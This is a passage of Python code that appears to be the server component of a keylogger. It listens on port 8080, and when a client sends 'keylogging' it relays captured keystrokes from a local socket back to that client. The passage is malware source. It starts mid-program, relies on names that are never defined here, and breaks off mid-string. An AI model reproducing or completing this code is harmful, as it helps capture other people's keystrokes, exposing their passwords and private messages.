import threading
threading.Thread(target=chrome).start()
print("[*] Starting Server . . . . . . . . . . . . . . . . . . . . . ..............OK")

print("[*] Listening On Port 8080 . . . . . . . . . . . . . . . . . . . ...........OK")

while True:
    c, addr = sock.accept()
    print("[*] New Connection: ", addr)
    if c.recv(1024).decode("utf-8") == "keylogging":
        c.send("ok".encode("utf-8"))
        s = socket.socket()
        s.connect(("localhost", 8080))
        while True:
            try:
                keylog = s.recv(1024).decode("utf-8")
                if keylog:
                    c.send(keylog.encode("utf-8"))
                    time.sleep(1/60)
                else:
                    time.sleep(1/60)
            except socket.error:
                print("[!] Server has been Disconnected
